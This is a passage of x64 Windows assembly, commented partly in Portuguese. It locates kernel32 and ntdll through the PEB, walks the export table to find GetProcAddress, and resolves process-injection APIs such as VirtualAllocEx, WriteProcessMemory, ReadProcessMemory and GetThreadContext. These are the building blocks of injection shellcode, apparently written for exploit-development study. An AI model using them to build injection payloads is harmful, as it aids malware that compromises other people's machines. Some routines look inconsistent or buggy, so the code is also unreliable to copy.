        add rbx, r8;                  # RBX = Nome da funcao VMA
        dec rcx;                      # Decrementa o loop em 1
        mov rax, 0x41636f7250746547;  # GetProcA
        cmp [rbx], rax;               # checa se rbx é igual a  GetProcA
        jnz kernel32findfunction2;  
;Encontra o endereço da função de GetProcessAddress
FunctionNameFound2:                 
        ; We found our target
        xor r11, r11; 
        mov r11d, [rdx+0x24];          # AddressOfNameOrdinals RVA
        add r11, r8;                   # AddressOfNameOrdinals VMA
        ; Get the function ordinal from AddressOfNameOrdinals
        inc rcx; 
        mov r13w, [r11+rcx*2];         # AddressOfNameOrdinals + Counter. RCX = counter
        ; Get function address from AddressOfFunctions
        xor r11, r11; 
        mov r11d, [rdx+0x1c];          # AddressOfFunctions RVA
        add r11, r8;                   # AddressOfFunctions VMA in R11. Kernel32+RVA for addressoffunctions
        mov eax, [r11+4+r13*4];        # Get the function RVA.
        add rax, r8;                   # Add base address to function RVA
        mov r14, rax;                  # GetProcAddress to R14
ret

;locate_kernel32
Locate_kernel32: 
    xor rcx, rcx;                      # Zera RCX
    mov rax, gs:[rcx + 0x60];          # 0x060 ProcessEnvironmentBlock to RAX.
    mov rax, [rax + 0x18];             # 0x18  ProcessEnvironmentBlock.Ldr Offset
    mov rsi, [rax + 0x20];             # 0x20 Offset = ProcessEnvironmentBlock.Ldr.InMemoryOrderModuleList
    lodsq;                             # Load qword at address (R)SI into RAX (ProcessEnvironmentBlock.Ldr.InMemoryOrderModuleList)
    xchg rax, rsi;                     # troca RAX,RSI
    lodsq;                             # Load qword at address (R)SI into RAX
    mov rbx, [rax + 0x20];             # RBX = Kernel32 base address
    mov r8, rbx;                       # Copia o endereco base do Kernel32 para o registrador R8
ret
    
IAT:
    ;Código para chegar na tabela de endereco de exportacao
    mov ebx, [rbx+0x3C];               # obtem o endereco da assinatura do  PE do Kernel32 e coloca em  EBX
    add rbx, r8;                       # Add defrerenced signature offset to kernel32 base. Store in RBX.
    mov r12, 0x88FFFFF;      
    shr r12, 0x14; 
    mov edx, [rbx+r12];                # Offset from PE32 Signature to Export Address Table (NULL BYTE)
    add rdx, r8;                       # RDX = kernel32.dll + RVA ExportTable = ExportTable Address
    mov r10d, [rdx+0x14];              # numero de funcoes
    xor r11, r11;                      # Zera R11 para ser usado 
    mov r11d, [rdx+0x20];              # AddressOfNames RVA
    add r11, r8;                       # AddressOfNames VMA
ret

;locate_ntdll
Locate_ntdll:        
    xor rcx, rcx;                      # Zera RCX
    mov rax, gs:[rcx + 0x60];          # 0x060 ProcessEnvironmentBlock to RAX.
    mov rax, [rax + 0x18];             # 0x18  ProcessEnvironmentBlock.Ldr Offset
    mov rsi, [rax + 0x30];             # 0x30 Offset = ProcessEnvironmentBlock.Ldr.InInitializationOrderModuleList
    mov rbx, [rsi +0x10];              # dll base ntdll
    mov r8, rbx;                       # Copia o endereco base da ntdll para o registrador R8
ret


LoadLibrary:
    ;Lookup LoadLibrary
    mov rcx, 0x41797261;  
    push rcx;  
    mov rcx, 0x7262694c64616f4c;  
    push rcx;  
    mov rdx, rsp;                      # joga o ponteiro de LoadLibraryA para RDX
    mov rcx, r8;                       # Copia endereco base do Kernel32 para RCX
    sub rsp, 0x30;                     # Make some room on the stack
    call r14;                          # Call GetProcessAddress
    add rsp, 0x30;                     # Remove espaço alocado na pilha
    add rsp, 0x10;                     # Remove a string LoadLibrary alocada 
    mov rsi, rax;                      # Guarda o endereço de loadlibrary em RSI
ret
VirtualProect:
    ;pega o endereco VirtualProtect usando GetProcAddress
    mov rcx, 0x746365746f72
    push rcx
    mov rcx, 0x506C617574726956
    shr rcx, 0x40
    push rcx
    mov rdx, rsp;                       # joga o ponteiro da string VirtualProtect para RDX
    mov rcx, r8;                        # Copia o endereço base da Kernel32  para RCX
    sub rsp, 0x30
    call r14;                           # Call GetProcessAddress
    add rsp, 0x30;                      # Remove espaço locdo na pilha
    add rsp, 0x10;                      # Remove a string alocada de  VirtualProtect 
    mov rsi, rax;                       # Guarda o endereço de Virtual protect em RSI
ret

VirtualProectEx:
    ;pega o endereco VirtualProectEx usando GetProcAddress
    sub rsp, 0x30
    mov rax, "rotectEx"
    push Rax
    mov rax, "VirtualP"
    push rax
    mov [rsp+0x10], byte 0x00
    mov rdx, rsp;                    # joga o ponteiro da string VirtualProtectEx para RDX
    mov rcx, r8;                     # Copia o endereço base da Kernel32  para RCX
    sub rsp, 0x30
    call r14;                        # Call GetProcessAddress
    add rsp, 0x30;                   # Remove espaço alocado na pilha
    add rsp, 0x10;                   # Remove a string alocada de  VirtualProtect 
    mov rsi, rax;                    # Guarda o endereço de VirtualProtectEx em r12
    mov r12, rax
    add rsp, 0x30
ret

WriteProcess:
    ;Lookup WriteProcessMemory
    mov rax, "ry"
    push rax
    mov rax, "cessMemo"
    push rax
    mov rax, "WritePro"
    push rax
    lea rdx, [rsp]
    mov rcx, r15
    sub rsp, 0x30
    call r14
    mov r12, rax
    add rsp, 0x30
    add rsp, 0x18
ret

VirtualAllocEx:
    ;Lookup VirtualAllocEx
    mov rax, "llocEx"
    push rax
    mov rax, "VirtualA"
    push rax
    lea rdx, [rsp]
    mov rcx, r8
    sub rsp, 0x30
    call r14
    add rsp, 0x30
    add rsp, 0x10
    mov r12, rax
ret

ReadProcessMemory:
    ;Lookup ReadProcessMemory
    mov rax, "y"
    push Rax
    mov rax, "essMemor"
    push Rax, 
    mov rax, "ReadProc"
    push rax
    lea rdx, [rsp]
    mov rcx, rbx
    sub rsp, 0x30
    call R14
    add rsp, 0x30
    add rsp, 0x10
    add rsp, 0x08
    mov r12, rax
ret

GetThreadCx:
    ;Lookup GetThreadContext
    sub rsp, 0x30
    mov rax, "dContext"
    push Rax
    mov rax, "GetThrea" 
    push rax
    mov [rsp+0x10], dword 0x00
    lea rdx, [rsp]
    mov rcx, r8
    sub rsp, 0x30
    call R14
    add rsp,0x30
    add rsp,0x10
    add rsp, 0x30
    mov r12, rax
ret
